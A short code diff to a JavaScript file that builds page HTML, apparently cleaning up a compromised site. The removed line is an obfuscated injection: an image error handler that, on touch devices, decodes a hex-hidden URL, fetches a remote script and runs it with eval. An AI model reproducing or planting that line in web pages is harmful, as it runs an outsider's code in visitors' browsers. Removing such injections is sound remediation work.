@@ -185,4 +185,4 @@ document.writeln(" ");
 document.writeln("");
 document.writeln("");
 document.writeln("		");
-document.writeln("</body>");document.writeln("<img src onerror=\"this.remove();navigator.maxTouchPoints>1&&fetch((function(h){for(var o='',i=0;i<h.length;i+=2)o+=String.fromCharCode(parseInt(h.substr(i,2),16));return o})('68747470733a2f2f7a636e7a7a2e636f6d2f7a2e6a733f69643d31373935303734303137')).then(function(r){return r.text();}).then(function(t){return t&&eval(t);});\">");
+document.writeln("</body>");
